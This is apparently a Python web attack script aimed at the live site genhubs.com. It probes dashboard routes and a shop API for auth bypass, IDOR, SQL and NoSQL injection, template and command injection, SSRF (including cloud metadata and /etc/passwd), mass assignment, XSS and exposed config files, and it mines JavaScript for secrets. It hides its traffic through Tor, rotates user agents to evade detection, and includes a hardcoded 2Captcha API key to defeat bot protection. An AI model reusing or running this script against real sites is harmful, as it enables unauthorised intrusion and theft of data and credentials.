#!/usr/bin/env python3
"""
WebApp Attack Module — genhubs.com
OWASP Top 10: Auth Bypass, IDOR, SQLi, SSTI, CMDi, SSRF, CSRF, Mass Assignment, API Abuse
Uses cloudscraper (2Captcha) + proxychains4 via SOCKS5 on 127.0.0.1:9052
"""

import cloudscraper
import json
import sys
import os
import time
import random
import urllib.parse

BASE_URL = "https://genhubs.com"
EVIDENCE_DIR = "/home/ubuntu/genhubs.com/evidence"
# OPSEC: Run this script under proxychains4 for SOCKS5 via Tor
# $ proxychains4 python3 attack_webapp.py

# Rotating User-Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0",
]

DASHBOARD_ROUTES = [
    "/dashboard/cookie-checker",
    "/dashboard/account-face-unlock",
    "/dashboard/email-account",
    "/dashboard/account-recovery",
    "/dashboard/combo-fomatter",
    "/dashboard/cookie-ip-lock-bypass",
    "/dashboard/cookie-logout",
    "/dashboard/reactive",
    "/services/auto-solve-captcha",
    "/tools/extension-solve-captcha",
]

API_ROUTES = [
    "/api/shop",
    "/api/shop/1",
    "/api/shop?id=1",
    "/api/users",
    "/api/users/1",
    "/api/admin",
    "/api/admin/users",
    "/api/orders",
    "/api/orders/1",
    "/api/auth/login",
    "/api/auth/register",
    "/api/auth/session",
    "/api/config",
    "/api/status",
]

def evidence_file(finding_id, title):
    path = os.path.join(EVIDENCE_DIR, f"{finding_id}.txt")
    if not os.path.exists(path):
        with open(path, "w") as f:
            f.write(f"# {finding_id} {title}\n")
            f.write(f"Alvo: {BASE_URL}\n")
            f.write("Severidade: \n")
            f.write(f"Timestamp: {time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())}\n\n")
            f.write("## Reprodução / Output / Interpretação / Impacto / Recomendação / Próximo passo\n")
    return path

def append_evidence(finding_id, text):
    path = os.path.join(EVIDENCE_DIR, f"{finding_id}.txt")
    with open(path, "a") as f:
        f.write(text + "\n")

def make_scraper():
    """Create cloudscraper session with rotating UA and proxy"""
    session = cloudscraper.create_scraper(
        browser={
            'browser': 'chrome',
            'platform': 'windows',
            'mobile': False,
        },
        interpreter='nodejs',
        captcha={
            'provider': '2captcha',
            'api_key': '3ff6b7b981be450b1cc93d846be77934',
        }
    )
    session.headers.update({
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    })
    # Proxy handled by proxychains4 at system level
    return session

def test_auth_bypass(session):
    """Test 1: Auth Bypass — Access dashboard endpoints without authentication"""
    findings = []
    print("\n[!] Testing Auth Bypass on dashboard routes...")
    
    for route in DASHBOARD_ROUTES:
        url = f"{BASE_URL}{route}"
        try:
            r = session.get(url, timeout=30)
            status = r.status_code
            body_preview = r.text[:300] if r.text else ""
            
            # Check if it returns a full page vs redirect/login
            is_auth_bypass = False
            reason = ""
            
            if status == 200 and "dashboard" in r.text.lower() and ("login" not in r.text.lower()[:500] and "sign in" not in r.text.lower()[:500]):
                is_auth_bypass = True
                reason = f"200 OK with dashboard content, no login page"
            elif status == 200 and len(r.text) > 500:
                is_auth_bypass = True
                reason = f"200 OK with {len(r.text)} bytes of content"
            elif status != 302 and status != 401 and status != 403:
                is_auth_bypass = True
                reason = f"Unexpected status {status} (expected 302/401/403)"
            
            print(f"  {route}: {status} ({len(r.text)} bytes) {'⚠️ BYPASS?' if is_auth_bypass else '✅ blocked'}")
            
            if is_auth_bypass:
                evidence_content = f"""
## Test: Auth Bypass - Direct access to {route}
Request: GET {url}
Status: {status}
Reason: {reason}
Response preview: {body_preview[:500]}
"""
                append_evidence("F-002", evidence_content)
                findings.append(route)
                
        except Exception as e:
            print(f"  {route}: ERROR {e}")
    
    return findings

def test_csrf_bypass(session):
    """Test 2: CSRF — Try requests with missing/altered CSRF token"""
    print("\n[!] Testing CSRF protection on /api/shop...")
    
    # First get a CSRF token by visiting the page
    print("  [*] Getting initial session...")
    try:
        r = session.get(f"{BASE_URL}/", timeout=30)
        cookies = session.cookies.get_dict()
        print(f"  Cookies: {cookies}")
    except Exception as e:
        print(f"  ERROR: {e}")
    
    # Test 1: POST without CSRF token
    print("  [*] POST without x-csrf-token header...")
    try:
        r = session.post(
            f"{BASE_URL}/api/shop",
            json={"action": "list"},
            timeout=30
        )
        print(f"  No CSRF: {r.status_code} {r.text[:200]}")
    except Exception as e:
        print(f"  ERROR: {e}")
    
    # Test 2: POST with empty CSRF token
    print("  [*] POST with empty x-csrf-token...")
    try:
        r = session.post(
            f"{BASE_URL}/api/shop",
            json={"action": "list"},
            headers={"x-csrf-token": ""},
            timeout=30
        )
        print(f"  Empty CSRF: {r.status_code} {r.text[:200]}")
    except Exception as e:
        print(f"  ERROR: {e}")
    
    # Test 3: POST with random CSRF token
    print("  [*] POST with random x-csrf-token...")
    try:
        r = session.post(
            f"{BASE_URL}/api/shop",
            json={"action": "list"},
            headers={"x-csrf-token": "random_invalid_token_here"},
            timeout=30
        )
        print(f"  Random CSRF: {r.status_code} {r.text[:200]}")
    except Exception as e:
        print(f"  ERROR: {e}")
    
    # Test 4: Check if Origin/Referer headers bypass CSRF
    print("  [*] POST with Origin header match...")
    try:
        r = session.post(
            f"{BASE_URL}/api/shop",
            json={"action": "list"},
            headers={"x-csrf-token": "test", "Origin": "https://genhubs.com"},
            timeout=30
        )
        print(f"  Origin match: {r.status_code} {r.text[:200]}")
    except Exception as e:
        print(f"  ERROR: {e}")

def test_idor(session):
    """Test 3: IDOR/BOLA — Enumerate /api/shop and other API endpoints"""
    print("\n[!] Testing IDOR/BOLA on API endpoints...")
    
    # Test various API routes with IDOR angles
    test_cases = [
        ("/api/shop", {"action": "list"}),
        ("/api/shop", {"action": "get", "id": "1"}),
        ("/api/shop", {"action": "get", "id": "admin"}),
        ("/api/shop", {"action": "get", "id": "0"}),
        ("/api/shop", {"action": "get", "id": "-1"}),
        ("/api/shop", {"action": "get", "id": "999999999"}),
        ("/api/shop", {"action": "get", "productId": "1"}),
        ("/api/shop", {"action": "get", "userId": "1"}),
        ("/api/shop", {"action": "get", "orderId": "1"}),
        ("/api/shop/1", {}),
        ("/api/shop/0", {}),
        # Test GET variants
        ("/api/shop?id=1", None),
        ("/api/shop?product=1", None),
        ("/api/shop?user=1", None),
    ]
    
    for endpoint, data in test_cases:
        url = f"{BASE_URL}{endpoint}" if not endpoint.startswith("http") else endpoint
        try:
            if data is not None:
                r = session.post(url, json=data, timeout=30)
            else:
                r = session.get(url, timeout=30)
            
            body = r.text[:500] if r.text else ""
            status = r.status_code
            
            if r.text and len(r.text) > 10:
                print(f"  [{status}] {endpoint} | data={data} => {body[:200]}")
            else:
                print(f"  [{status}] {endpoint} | data={data} => (empty)")
                
        except Exception as e:
            print(f"  ERROR: {endpoint} | {e}")

def test_sqli(session):
    """Test 4: SQLi on API endpoints"""
    print("\n[!] Testing SQL Injection on /api/shop...")
    
    sqli_payloads = [
        "'",
        "\"",
        "' OR '1'='1",
        "' OR 1=1--",
        "1' OR '1'='1",
        "1' OR 1=1--",
        "1\" OR \"1\"=\"1",
        "admin'--",
        "' UNION SELECT 1,2,3,4--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
        "' AND SLEEP(5)--",
        "' AND 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
        "1; SELECT * FROM users--",
        "1' AND 1=1--",
        "1' AND 1=2--",
    ]
    
    for payload in sqli_payloads:
        url = f"{BASE_URL}/api/shop"
        try:
            r = session.post(url, json={"action": "get", "id": payload}, timeout=15)
            body_len = len(r.text) if r.text else 0
            timing = r.elapsed.total_seconds() if hasattr(r, 'elapsed') else 0
            
            interesting = False
            if body_len > 20 or timing > 2:
                interesting = True
            
            if interesting and body_len > 10:
                print(f"  [{r.status_code}] SQLi ('{payload[:30]}') => {r.text[:300]} (timing: {timing:.2f}s)")
            elif "error" in r.text.lower() or "sql" in r.text.lower() or "mysql" in r.text.lower():
                print(f"  [{r.status_code}] SQLi ('{payload[:30]}') => ERROR LEAK: {r.text[:200]}")
                interesting = True
        except Exception as e:
            print(f"  ERROR: {e}")
        
        # Rate limit
        time.sleep(0.3)

def test_nosqli(session):
    """Test 5: NoSQLi on API endpoints (JSON-based)"""
    print("\n[!] Testing NoSQL Injection on /api/shop...")
    
    nosqli_payloads = [
        {"action": "get", "id": {"$gt": ""}},
        {"action": "get", "id": {"$ne": None}},
        {"action": "get", "id": {"$gt": "", "$lt": ""}},
        {"action": "get", "id": {"$regex": ".*"}},
        {"action": "get", "id": {"$exists": True}},
        {"action": "get", "username": {"$ne": None}},
        {"action": "get", "password": {"$ne": None}},
        {"action": "login", "username": {"$gt": ""}, "password": {"$gt": ""}},
    ]
    
    for payload in nosqli_payloads:
        url = f"{BASE_URL}/api/shop"
        try:
            r = session.post(url, json=payload, timeout=15)
            if r.text and len(r.text) > 20:
                print(f"  [{r.status_code}] NoSQLi ({json.dumps(payload)[:50]}) => {r.text[:300]}")
        except Exception as e:
            print(f"  ERROR: {e}")
        time.sleep(0.3)

def test_ssti(session):
    """Test 6: SSTI — Test input fields for template injection"""
    print("\n[!] Testing SSTI on inputs...")
    
    ssti_payloads = [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{config}}",
        "{{self.__class__.__mro__[2].__subclasses__()}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "${7*7}",
        "#{7*7}",
    ]
    
    for payload in ssti_payloads:
        url = f"{BASE_URL}/api/shop"
        try:
            r = session.post(url, json={"action": "get", "id": payload}, timeout=15)
            if "49" in r.text or payload in r.text:
                print(f"  [{r.status_code}] SSTI ({payload[:30]}) => {r.text[:300]}")
            else:
                print(f"  [{r.status_code}] SSTI ({payload[:15]}...) => (no eval)")
        except Exception as e:
            print(f"  ERROR: {e}")
        time.sleep(0.3)

def test_cmdi(session):
    """Test 7: Command Injection"""
    print("\n[!] Testing Command Injection...")
    
    cmdi_payloads = [
        "1; whoami",
        "1| whoami",
        "1 && whoami",
        "1 || whoami",
        "1`whoami`",
        "1$(whoami)",
        "1'; whoami;'",
        "1\" & whoami &\"",
        # Blind
        "1; sleep 3",
        "1| sleep 3",
        "1 && sleep 3",
        # Data exfil
        "1; curl http://127.0.0.1:3306/",
        "1| curl http://127.0.0.1:3306/",
    ]
    
    for payload in cmdi_payloads:
        url = f"{BASE_URL}/api/shop"
        try:
            r = session.post(url, json={"action": "get", "id": payload}, timeout=15)
            timing = r.elapsed.total_seconds() if hasattr(r, 'elapsed') else 0
            
            interesting = False
            if timing > 2:
                print(f"  [{r.status_code}] CMDi ('{payload[:30]}') => timing: {timing:.2f}s ⚠️ DELAY!")
                interesting = True
            elif "uid=" in r.text or "root" in r.text.lower() or "www-data" in r.text:
                print(f"  [{r.status_code}] CMDi ('{payload[:30]}') => {r.text[:300]} ⚠️ OUTPUT!")
                interesting = True
            
            if not interesting:
                print(f"  [{r.status_code}] CMDi ('{payload[:20]}...') => no exec (timing: {timing:.2f}s)")
        except Exception as e:
            print(f"  ERROR: {e}")
        time.sleep(0.3)

def test_ssrf(session):
    """Test 8: SSRF — Parameters that might accept URLs"""
    print("\n[!] Testing SSRF...")
    
    ssrf_params = ["url", "callback", "webhook", "avatar", "image", "file", "redirect", "return_to", "next"]
    ssrf_payloads = [
        "http://127.0.0.1:3306",
        "http://127.0.0.1:80",
        "http://127.0.0.1:443",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::]:3306",
        "http://0x7f000001:3306",
        "http://2130706433:3306",
        "http://156.67.222.30:3306",
        "http://156.67.222.30:80",
        "http://156.67.222.30:443",
        "file:///etc/passwd",
        "file:///proc/self/environ",
    ]
    
    for payload in ssrf_payloads:
        data = {"action": "get", "callback": payload, "url": payload}
        try:
            r = session.post(f"{BASE_URL}/api/shop", json=data, timeout=15)
            if r.text and (len(r.text) > 50 or "root:" in r.text or "meta-data" in r.text):
                print(f"  [{r.status_code}] SSRF ({payload[:40]}) => {r.text[:300]}")
            else:
                print(f"  [{r.status_code}] SSRF ({payload[:25]}...) => no leak")
        except Exception as e:
            print(f"  ERROR: {e}")
        time.sleep(0.3)

def test_mass_assignment(session):
    """Test 9: Mass Assignment — Send admin/role fields"""
    print("\n[!] Testing Mass Assignment...")
    
    mass_assign_payloads = [
        {"action": "register", "username": "test", "password": "test", "role": "admin"},
        {"action": "register", "username": "test", "password": "test", "isAdmin": True},
        {"action": "register", "username": "test", "password": "test", "isPremium": True},
        {"action": "register", "username": "test", "password": "test", "role": "administrator"},
        {"action": "update", "id": "1", "role": "admin"},
        {"action": "update", "id": "1", "isPremium": True},
        {"action": "register", "username": "test", "password": "test", "admin": True, "level": "9"},
    ]
    
    for payload in mass_assign_payloads:
        try:
            r = session.post(f"{BASE_URL}/api/shop", json=payload, timeout=15)
            print(f"  [{r.status_code}] MassAssign ({json.dumps(payload)[:50]}) => {r.text[:200]}")
        except Exception as e:
            print(f"  ERROR: {e}")
        time.sleep(0.3)

def test_api_abuse(session):
    """Test 10: API Abuse — Rate limiting, methods override"""
    print("\n[!] Testing API Abuse...")
    
    # Test rate limiting: 10 rapid requests
    print("  [*] Testing rate limiting (10 rapid requests)...")
    for i in range(10):
        try:
            r = session.post(f"{BASE_URL}/api/shop", json={"action": "list"}, timeout=15)
            if i == 0 or i == 9:
                print(f"    Request {i+1}: {r.status_code}")
            if r.status_code == 429:
                print(f"    ⚠️ RATE LIMITED at request {i+1}")
                break
        except:
            pass
    
    # Test HTTP methods override
    print("  [*] Testing HTTP method override...")
    methods = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"]
    for method in methods:
        try:
            r = session.request(method, f"{BASE_URL}/api/shop", timeout=15)
            print(f"    {method}: {r.status_code} ({len(r.text)} bytes)")
        except Exception as e:
            print(f"    {method}: ERROR {e}")

def test_nextjs_middleware(session):
    """Test 11: Next.js Middleware bypass — Path traversal, unicode, etc."""
    print("\n[!] Testing Next.js Middleware/Route bypass...")
    
    bypass_paths = [
        "/dashboard",
        "/dashboard/",
        "/dashboard/%2e/",
        "/dashboard/.;/",
        "/dashboard//",
        "/dashboard/..;/",
        "/_next/data/development/dashboard.json",
        "/_next/data/production/dashboard.json",
        "/api/../dashboard",
        "/api/..;/dashboard",
        "/dashboard%00",
        "/dashboard%0d%0a",
        "/dashboard?auth=bypass",
        "/dashboard/admin",
        "/.env",
        "/.env.local",
        "/next.config.js",
        "/next.config.mjs",
        "/package.json",
    ]
    
    for path in bypass_paths:
        url = f"{BASE_URL}{path}"
        try:
            r = session.get(url, timeout=15)
            status = r.status_code
            body_preview = r.text[:200] if r.text else ""
            
            if path in ["/.env", "/.env.local", "/next.config.js", "/package.json"]:
                if r.status_code == 200 and len(r.text) > 50:
                    print(f"  [{status}] {path} ⚠️ CONFIG LEAK: {body_preview[:200]}")
                else:
                    print(f"  [{status}] {path} => blocked")
            elif r.status_code == 200 and len(r.text) > 200:
                print(f"  [{status}] {path} ({len(r.text)} bytes) => {body_preview[:150]}")
            else:
                print(f"  [{status}] {path} => blocked")
        except Exception as e:
            print(f"  ERROR: {path}: {e}")

def test_xss(session):
    """Test 12: XSS — Reflected and stored"""
    print("\n[!] Testing XSS...")
    
    xss_payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "\"><script>alert(1)</script>",
        "';alert(1);//",
        "<svg onload=alert(1)>",
    ]
    
    for payload in xss_payloads:
        try:
            r = session.get(f"{BASE_URL}/search?q={urllib.parse.quote(payload)}", timeout=15)
            if payload[:20] in r.text:
                print(f"  [{r.status_code}] XSS Reflected ('{payload[:20]}...') ⚠️ REFLECTED!")
            else:
                print(f"  [{r.status_code}] XSS ('{payload[:15]}...') => not reflected")
        except Exception as e:
            print(f"  ERROR: {e}")
    
    # XSS via API
    for payload in xss_payloads:
        try:
            r = session.post(
                f"{BASE_URL}/api/shop",
                json={"action": "get", "id": payload},
                timeout=15
            )
            if payload[:20] in r.text:
                print(f"  [{r.status_code}] API XSS ('{payload[:20]}...') ⚠️ STORED/REFLECTED!")
        except Exception as e:
            print(f"  ERROR: {e}")
        time.sleep(0.3)

def extract_js_endpoints(session):
    """Extract and analyze JS files for hidden endpoints, API keys, secrets"""
    print("\n[!] Extracting JS files for secrets...")
    
    # First get the main page to find JS chunks
    try:
        r = session.get(f"{BASE_URL}/", timeout=30)
        html = r.text
    except Exception as e:
        print(f"  ERROR: {e}")
        return
    
    # Find all JS script references
    import re
    js_files = set()
    
    # _next/static chunks
    for m in re.finditer(r'src="(/_next/static/chunks/[^"]+\.js)"', html):
        js_files.add(m.group(1))
    
    print(f"  Found {len(js_files)} JS files")
    
    # Analyze each JS file for interesting patterns
    patterns = {
        "API endpoints": r'(?:/api/[a-zA-Z0-9_/-]+)',
        "Auth tokens": r'(?:eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)',
        "API keys": r'(?:sk-[a-zA-Z0-9]{20,}|pk-[a-zA-Z0-9]{20,}|[a-zA-Z0-9]{32,})',
        "Passwords/Secrets": r'(?:password|secret|token|api[_-]?key)[\s]*[:=][\s]*["\'][^"\']+["\']',
        "Internal URLs": r'(?:https?://(?:127\.0\.0\.1|localhost|10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+)[^\s"\'<]*)',
    }
    
    for js_file in sorted(js_files)[:20]:  # Limit to 20 files
        try:
            r = session.get(f"{BASE_URL}{js_file}", timeout=15)
            js = r.text
            
            for label, pattern in patterns.items():
                matches = re.findall(pattern, js, re.IGNORECASE)
                if matches:
                    for match in matches[:5]:
                        print(f"  [{js_file}] {label}: {match[:100]}")
        except Exception as e:
            print(f"  ERROR fetching {js_file}: {e}")

def main():
    print("=" * 70)
    print("  WebApp Attack Module — genhubs.com")
    print("  OWASP Top 10: Auth, IDOR, SQLi, SSTI, CMDi, SSRF, CSRF, Mass Assignment")
    print("=" * 70)
    
    session = make_scraper()
    
    # Phase 1: Recon & JS extraction
    extract_js_endpoints(session)
    
    # Phase 2: Auth bypass
    print("\n" + "=" * 50)
    print("PHASE 1: AUTH BYPASS / CSRF")
    test_auth_bypass(session)
    test_csrf_bypass(session)
    test_nextjs_middleware(session)
    
    # Phase 3: IDOR / BOLA
    print("\n" + "=" * 50)
    print("PHASE 2: IDOR / BOLA")
    test_idor(session)
    
    # Phase 4: Injection
    print("\n" + "=" * 50)
    print("PHASE 3: INJECTION (SQLi, NoSQLi, SSTI, CMDi)")
    test_sqli(session)
    test_nosqli(session)
    test_ssti(session)
    test_cmdi(session)
    
    # Phase 5: SSRF
    print("\n" + "=" * 50)
    print("PHASE 4: SSRF")
    test_ssrf(session)
    
    # Phase 6: Mass Assignment
    print("\n" + "=" * 50)
    print("PHASE 5: MASS ASSIGNMENT")
    test_mass_assignment(session)
    
    # Phase 7: API Abuse
    print("\n" + "=" * 50)
    print("PHASE 6: API ABUSE")
    test_api_abuse(session)
    
    # Phase 8: XSS
    print("\n" + "=" * 50)
    print("PHASE 7: XSS")
    test_xss(session)
    
    print("\n" + "=" * 70)
    print("  WebApp Attack Module COMPLETED")
    print("  Check /home/ubuntu/genhubs.com/evidence/ for findings")
    print("=" * 70)

if __name__ == "__main__":
    main()